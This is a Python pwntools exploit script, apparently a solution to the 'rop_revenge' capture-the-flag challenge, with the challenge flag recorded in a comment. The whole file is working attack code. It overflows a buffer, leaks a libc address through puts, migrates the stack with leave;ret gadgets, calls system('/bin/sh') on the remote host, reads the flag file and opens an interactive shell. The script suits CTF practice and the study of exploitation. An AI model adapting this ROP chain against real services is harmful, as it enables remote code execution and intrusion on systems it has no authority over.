#!/usr/bin/env python
from pwn import *

# AD{st4ck_m1grat10n_15_p0werfu1!!!}

context.arch = 'amd64'

e , l = ELF('./rop_revenge') , ELF('./libc.so.6')

host , port = 'ctf.yuawn.idv.tw' , 10109
y = remote( host , port )

name = 0x601080
main = 0x400636
pop_rdi = 0x400723
pop_rbp = 0x4005a0
leave_ret = 0x4006bd

p = flat(
    'D' * 0x40,
    pop_rdi,
    e.got['__libc_start_main'],
    e.plt['puts'],
    pop_rbp,
    name + 0x250 + 0x20,
    0x400693,
)

y.sendafter( '?' , p )

p = flat(
    'D' * 0x20,
    name + 0x40 - 8,
    leave_ret
)

y.sendafter( '?' , p )

y.recvline()
y.recvline()

l.address += u64( y.recv(6).ljust( 8 , '\x00' ) ) - l.symbols['__libc_start_main']
log.success('libc -> {}'.format( hex(l.address) ))

p = flat(
    pop_rdi,
    l.search( '/bin/sh\x00' ).next(),
    l.symbols['system'],
    0,
    name + 0x250 - 8,
    leave_ret
)

sleep(1)

y.send( p )

sleep(1)

y.sendline( 'cat /home/`whoami`/flag' )

y.interactive()